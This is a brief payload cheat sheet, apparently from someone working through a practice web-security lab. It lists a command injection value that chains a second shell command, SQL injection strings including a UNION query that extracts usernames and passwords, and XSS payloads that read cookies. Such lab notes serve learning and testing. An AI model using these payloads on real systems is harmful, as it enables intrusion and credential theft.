Author: Pratyaksha Beri
Date: 7 September 2020

Command Injection - 8.8.8.8 && dir

SQL Injection - %' or '0'='0
	Escalation: %' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #

XSS DOM - "></option><script>alert(document.cookie)</script><option value="blah

XSS Reflected - <script>alert(document.cookie)</script>

XSS Stored - <script>alert(document.domain)</script>Nice book
